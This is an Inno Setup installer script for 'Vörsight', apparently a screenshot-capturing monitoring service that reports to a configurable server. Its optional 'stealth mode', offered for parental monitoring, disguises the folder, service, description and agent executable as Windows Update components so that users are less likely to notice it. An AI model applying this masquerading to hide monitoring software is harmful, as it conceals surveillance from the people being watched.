; Vörsight Installation Script
; Inno Setup 6.x

#define MyAppName "Vörsight"
#define MyAppVersion "1.0.0"
#define MyAppPublisher "Vörsight"
#define MyAppURL "https://github.com/your-repo/vorsight"
#define MyAppServiceExeName "Vorsight.Service.exe"
#define MyAppAgentExeName "Vorsight.Agent.exe"

; Stealth mode naming (changed via preprocessor or runtime)
#ifndef StealthMode
  #define StealthMode 0
#endif

[Setup]
; Basic app info
AppId={{8F4E3D2A-9B7C-4E1D-8A5F-6C3D2B1A0E9F}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}

; Default installation directory
#if StealthMode == 1
  DefaultDirName={autopf}\Windows Update Helper
#else
  DefaultDirName={autopf}\Vörsight
#endif

; Privileges - Must be admin for Windows Service installation
; (Windows services cannot be installed per-user, only system-wide)
PrivilegesRequired=admin
PrivilegesRequiredOverridesAllowed=commandline

; Output
OutputDir=..\Output
OutputBaseFilename=VorsightSetup
Compression=lzma2
SolidCompression=yes

; UI
WizardStyle=modern
DisableWelcomePage=no
DisableDirPage=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
; Service executable and dependencies
Source: "..\publish\Service\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

; Agent executable
Source: "..\publish\Agent\*"; DestDir: "{app}\Agent"; Flags: ignoreversion recursesubdirs createallsubdirs

; Configuration template (will be modified during install)
; onlyifdoesntexist prevents overwriting during upgrades
Source: "..\src\Vorsight.Service\appsettings.json"; DestDir: "{app}"; Flags: ignoreversion onlyifdoesntexist; AfterInstall: ConfigureAppSettings

[Dirs]
; Create directories for runtime data
Name: "{commonappdata}\Vörsight"
Name: "{commonappdata}\Vörsight\logs"
Name: "{commonappdata}\Vörsight\screenshots"

[Code]
var
  ServerUrlPage: TInputQueryWizardPage;
  PresharedKeyPage: TInputQueryWizardPage;
  StealthModePage: TInputOptionWizardPage;
  
  ConfiguredServerUrl: String;
  ConfiguredPSK: String;
  EnableStealthMode: Boolean;

const
  RegKey = 'Software\Vorsight';
  RegStealthValue = 'StealthMode';

function IsStealthModeInstalled(): Boolean;
var
  StealthValue: Cardinal;
begin
  // Check registry to see if stealth mode was enabled during installation
  Result := False;
  if RegQueryDWordValue(HKEY_LOCAL_MACHINE, RegKey, RegStealthValue, StealthValue) then
    Result := (StealthValue = 1);
end;

function IsAppInstalled(): Boolean;
var
  AppPath: String;
begin
  // Check if the application is already installed by looking for the service executable
  AppPath := ExpandConstant('{app}\{#MyAppServiceExeName}');
  Result := FileExists(AppPath);
end;

function IsUpgrade(): Boolean;
begin
  // Check if this is an upgrade installation
  Result := IsAppInstalled;
end;

function GetServiceName(): String;
begin
  // Return appropriate service name based on stealth mode
  if IsStealthModeInstalled then
    Result := 'WindowsUpdateService'
  else
    Result := 'VorsightService';
end;

function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
  ServiceName: String;
begin
  Result := True;
  
  // If upgrading, stop the service before installation
  if IsUpgrade then
  begin
    ServiceName := GetServiceName;
    Log('Detected upgrade installation. Stopping service: ' + ServiceName);
    
    // Stop the service
    Exec('sc', 'stop ' + ServiceName, '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    
    // Wait for service to fully stop
    Sleep(3000);
  end;
end;

procedure InitializeWizard;
begin
  // Only show configuration pages during fresh installation, not upgrades
  if not IsUpgrade then
  begin
    // Page 1: Server Configuration
    ServerUrlPage := CreateInputQueryPage(wpSelectDir,
      'Server Configuration', 
      'Configure connection to Vörsight server',
      'Enter the URL of your Vörsight server (e.g., http://raspberrypi.local:3000)');
    ServerUrlPage.Add('Server URL:', False);
    ServerUrlPage.Values[0] := 'http://localhost:3000';

    // Page 2: Pre-Shared Key
    PresharedKeyPage := CreateInputQueryPage(ServerUrlPage.ID,
      'Authentication', 
      'Configure authentication key',
      'Enter the pre-shared key (PSK) that matches your server configuration.');
    PresharedKeyPage.Add('Pre-shared Key:', False);
    PresharedKeyPage.Values[0] := '';
    
    // Page 3: Stealth Mode (optional)
    StealthModePage := CreateInputOptionPage(PresharedKeyPage.ID,
      'Installation Mode',
      'Optional: Enable stealth mode for parental monitoring',
      'Stealth mode makes the application less obvious to tech-savvy users by using generic naming.',
      False, False);
    StealthModePage.Add('Use stealth application naming (appears as "Windows Update Helper")');
  end;
end;

function NextButtonClick(CurPageID: Integer): Boolean;
begin
  Result := True;
  
  // Only validate configuration pages during fresh installation
  if not IsUpgrade then
  begin
    if CurPageID = ServerUrlPage.ID then
    begin
      if Trim(ServerUrlPage.Values[0]) = '' then
      begin
        MsgBox('Please enter a server URL.', mbError, MB_OK);
        Result := False;
      end
      else
        ConfiguredServerUrl := Trim(ServerUrlPage.Values[0]);
    end;
    
    if CurPageID = PresharedKeyPage.ID then
    begin
      if Trim(PresharedKeyPage.Values[0]) = '' then
      begin
        MsgBox('Please enter a pre-shared key.', mbError, MB_OK);
        Result := False;
      end
      else
        ConfiguredPSK := Trim(PresharedKeyPage.Values[0]);
    end;
    
    if CurPageID = StealthModePage.ID then
    begin
      EnableStealthMode := StealthModePage.Values[0];
    end;
  end;
end;

procedure ConfigureAppSettings();
var
  AppSettingsFile: String;
  FileContent: AnsiString;
  JsonContent: String;
begin
  // Only configure appsettings.json during fresh installation
  // The onlyifdoesntexist flag in [Files] section prevents this from running during upgrades
  if IsUpgrade then
  begin
    Log('Upgrade detected: preserving existing appsettings.json');
    Exit;
  end;
  
  AppSettingsFile := ExpandConstant('{app}\appsettings.json');
  
  // Read the template appsettings.json
  LoadStringFromFile(AppSettingsFile, FileContent);
  JsonContent := String(FileContent);
  
  // Replace placeholders with user-provided values
  StringChangeEx(JsonContent, '"Url": "http://localhost:3000"', '"Url": "' + ConfiguredServerUrl + '"', True);
  StringChangeEx(JsonContent, '"PresharedKey": "your-secure-key"', '"PresharedKey": "' + ConfiguredPSK + '"', True);
  
  // Adjust paths for Agent executable based on stealth mode
  if EnableStealthMode then
  begin
    StringChangeEx(JsonContent, '"ExecutablePath": "Vorsight.Agent.exe"', '"ExecutablePath": "Agent\\wuhelper.exe"', True);
  end
  else
  begin
    StringChangeEx(JsonContent, '"ExecutablePath": "Vorsight.Agent.exe"', '"ExecutablePath": "Agent\\Vorsight.Agent.exe"', True);
  end;
  
  // Save modified configuration
  SaveStringToFile(AppSettingsFile, AnsiString(JsonContent), False);
  
  // Store stealth mode setting in registry for uninstaller
  if EnableStealthMode then
    RegWriteDWordValue(HKEY_LOCAL_MACHINE, RegKey, RegStealthValue, 1)
  else
    RegWriteDWordValue(HKEY_LOCAL_MACHINE, RegKey, RegStealthValue, 0);
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  ServiceName: String;
  ResultCode: Integer;
begin
  if CurUninstallStep = usUninstall then
  begin
    // Determine which service name to use based on installation mode
    if IsStealthModeInstalled then
      ServiceName := 'WindowsUpdateService'
    else
      ServiceName := 'VorsightService';
    
    // Stop the service
    Exec('sc', 'stop ' + ServiceName, '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    
    // Wait for service to fully stop
    Sleep(2000);
    
    // Uninstall the service
    if IsStealthModeInstalled then
      Exec(ExpandConstant('{app}\{#MyAppServiceExeName}'), 'uninstall --service-name WindowsUpdateService', '', SW_HIDE, ewWaitUntilTerminated, ResultCode)
    else
      Exec(ExpandConstant('{app}\{#MyAppServiceExeName}'), 'uninstall', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    
    // Clean up registry
    RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, RegKey);
  end;
end;

[Run]
; Install and start the Windows Service
; Note: During upgrades, the service is already installed, so we just need to start it
#if StealthMode == 1
  Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install --service-name WindowsUpdateService --display-name ""Windows Update Helper Service"" --description ""Provides background update checking and system health monitoring"""; StatusMsg: "Installing Windows service..."; Flags: runhidden nowait; Check: not IsUpgrade
  Filename: "sc"; Parameters: "start WindowsUpdateService"; StatusMsg: "Starting service..."; Flags: runhidden nowait
#else
  Filename: "{app}\{#MyAppServiceExeName}"; Parameters: "install"; StatusMsg: "Installing Windows service..."; Flags: runhidden nowait; Check: not IsUpgrade
  Filename: "sc"; Parameters: "start VorsightService"; StatusMsg: "Starting service..."; Flags: runhidden nowait
#endif

[UninstallDelete]
; Clean up runtime data
Type: filesandordirs; Name: "{commonappdata}\Vörsight"
